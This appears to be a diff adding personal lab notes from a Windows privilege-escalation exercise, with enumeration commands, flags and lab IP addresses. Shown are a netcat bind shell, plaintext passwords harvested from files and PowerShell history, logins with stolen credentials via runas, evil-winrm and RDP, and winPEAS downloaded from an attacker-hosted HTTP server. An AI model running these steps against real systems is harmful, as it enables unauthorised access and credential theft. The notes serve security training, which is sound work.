@@ -1,0 +1,124 @@
+Windows Privilege Escalation
+
+Enumerating Windows
+
+whoami /groups
+icacls
+net user
+net user steve
+get-localuser
+get-localgroup
+Get-LocalGroupMember Administrators
+
+systeminfo
+ipconfig /all
+route print
+netstat -ano
+
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+Get-Process
+
+attacker 192.168.49.54
+target 192.168.54.221
+
+no locked screen:
+xfce4-power-manager-settings
+uncheck display, system
+
+xfreerdp3 /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.54.221
+Get-LocalGroupMember Administrators
+roy
+
+Get-Process -Name "nonstandardprocess" | Select-Object Path
+C:\Users\mac\AppData\Roaming\SuperCompany\NonStandardProcess.exe
+OS{05a250e23e4a5ec29de5ca62281f0b2b}
+
+----------
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+type C:\xampp\passwords.txt
+
+target 192.168.54.220
+
+nc 192.168.54.220 4444
+(netcat is a raw networking tool, not an authentication service, nc -l -p 4444 -e cmd.exe, bind shell)
+whoami
+clientwk220\dave
+
+steve
+securityIsNotAnOption++++++
+xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.54.220
+
+runas /user:backupadmin cmd
+backupadmin
+admin123admin123!
+
+c:\users\backupadmin\desktop
+OS{a2859eb3b82e8a4cf432c733e9c74eb9}
+
+Get-ChildItem -Path C:\users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+type C:\users\steve\Contacts\logins.txt
+thisIsWhatYouAreLookingFor
+
+---------
+Get-History
+Clear-History
+(Get-PSReadlineOption).HistorySavePath
+type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+Server02 Admin PW
+paperEarMonitor33@
+ 
+Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
+Stop-Transcript
+
+daveadmin
+qwertqwertqwert123!!
+
+PowerShell remoting session via WinRM in a bind shell:
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+
+target 192.168.54.220
+
+nc 192.168.54.220 4444
+
+evil-winrm -i 192.168.54.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+c:\users\daveadmin\desktop\flag.txt
+OS{282283c7484493045d3a7f553fdc88f5}
+
+xfreerdp3 /u:daveadmin /p:qwertqwertqwert123\!\! /v:192.168.54.220
+
+To find PowerShell script block logging events in Event Viewer, navigate to the Applications and Services Logs and look for Event ID 4104 in the Microsoft-Windows-PowerShell/Operational log
+In the left-hand pane of Event Viewer, expand the following path: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational (then filter event id 4104)
+(or: Get-WinEvent -FilterHashtable @{logname = "Microsoft-Windows-PowerShell/Operational"; id = 4104 } | Select-Object -ExpandProperty Message)
+
+dave:ThereIsNoSecretCowLevel1337
+
+-----------
+target 192.168.54.220
+attacker 192.168.49.54
+
+'Checking for DPAPI Master Files' section
+look for one of masterkeys
+
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+python3 -m http.server 80
+
+nc 192.168.54.220 4444
+powershell
+iwr -uri http://192.168.49.54/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+
+masterkey: 
+C:\Users\dave\AppData\Roaming\Microsoft\Protect\S-1-5-21-2309961351-4093026482-2223492918-1002\1a65c284-d429-4e6b-b7ab-5fc1a2d95636
+
+
+
+
+
+
